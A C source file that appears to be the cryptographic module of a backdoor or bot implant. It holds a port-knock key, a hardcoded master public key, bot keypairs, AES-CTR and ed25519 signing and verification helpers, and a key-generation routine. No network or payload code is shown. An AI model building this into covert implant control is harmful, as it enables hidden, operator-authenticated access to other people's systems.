#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/utsname.h>

#include "degu.h"
#include "aes.h"
#include "ge.h"
#include "sc.h"
#include "ed25519.h"

unsigned char knock_key[32] = KNOCK_KEY;
unsigned char public_key[32] = MASTER_PUBKEY;
unsigned char bot_public_key[32];
unsigned char bot_private_key[64];

void xdata(uint8_t *key, unsigned char* data, ssize_t len){    
    uint8_t iv[16]  = IV;
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);
    AES_CTR_xcrypt_buffer(&ctx, data, len);
}

int xbuf(unsigned char *destkey,unsigned char *privkey, unsigned char *data, size_t len){
    unsigned char seed[32], secret[32]={0};
    ed25519_create_seed(seed);
    ed25519_key_exchange(secret, destkey, privkey);
    xdata(secret,data,len);
    return 0;
}

void xsig(unsigned char* signature, const unsigned char* message, size_t message_len, const unsigned char* private_key){
     ed25519_sign(signature, message,message_len, public_key, private_key);
}

unsigned int xvrfy(const unsigned char* signature, const unsigned char* message, size_t message_len){
    return ed25519_verify( signature,  message,  message_len, public_key );
}

void xnock(unsigned char* data, ssize_t len){
    struct AES_ctx knockctx;
    uint8_t iv[16]  = IV;
    AES_init_ctx_iv(&knockctx, knock_key, iv);
    AES_CTR_xcrypt_buffer(&knockctx, data, len);
}

void setup_keys(void){
    unsigned char seed[32];
    TRACE("generating seed");
    ed25519_create_seed(seed);
    ed25519_create_keypair(bot_public_key, bot_private_key, seed);
}

void xpub(unsigned char *destkey,unsigned char *privkey){

    int i=0;
    uint8_t iv[16]  = IV;
    uint8_t knock[32]  = KNOCK_KEY;
    uint8_t master[32]  = MASTER_PUBKEY;
    printf("#define IV\t\t{");
    for(i=0;i<15;i++)
        printf("0x%02x,",iv[i]);
    printf("0x%02x}\n",iv[15]);

    printf("#define KNOCK_KEY\t{");
    for(i=0;i<31;i++)
        printf("0x%02x,",knock[i]);
    printf("0x%02x}\n",knock[31]);

    printf("#define MASTER_PUBKEY\t{");
    for(i=0;i<31;i++)
        printf("0x%02x,",master[i]);
    printf("0x%02x}\n",master[31]);
}

void keygen(char* path){

    unsigned char  eph_knock[32], eph_public_key[32], eph_private_key[64], eph_seed[32];
    unsigned char  test_public_key[32], test_private_key[64];
    int i = 0;

    ed25519_create_seed(eph_seed);
    ed25519_create_seed(eph_knock);
    ed25519_create_keypair(eph_public_key, eph_private_key, eph_seed);
    ed25519_create_keypair(test_public_key, test_private_key, eph_knock);

    FILE *out = fopen(path,"w");

    if(out < 0)
        return;

    fprintf(out,"pub=\"");
    for(i=0;i<32;i++)
        fprintf(out,"%02x",eph_public_key[i]);
    fprintf(out,"\"\n");
    fprintf(out,"priv=\"");
    for(i=0;i<64;i++)
        fprintf(out,"%02x",eph_private_key[i]);
    fprintf(out,"\"\n");
    fprintf(out,"iv=\"");
    for(int i=0;i<16;i++)
        fprintf(out,"%02x",eph_seed[i]);
    fprintf(out,"\"\n");
    fprintf(out,"knock=\"");
    for(int i=0;i<32;i++)
        fprintf(out,"%02x",eph_knock[i]);
    fprintf(out,"\"\n");

    unsigned char shared_secret[32];
    ed25519_key_exchange(shared_secret, eph_public_key, test_private_key);

    fprintf(out,"secret1=\"");
    for(int i=0;i<32;i++)
        fprintf(out,"%02x",shared_secret[i]);
    fprintf(out,"\"\n");

    unsigned char eph_shared_secret[32];
    ed25519_key_exchange(eph_shared_secret, test_public_key, eph_private_key);

    fprintf(out,"secret2=\"");
    for(int i=0;i<32;i++)
        fprintf(out,"%02x",eph_shared_secret[i]);
    fprintf(out,"\"\n");

    fclose(out);
}
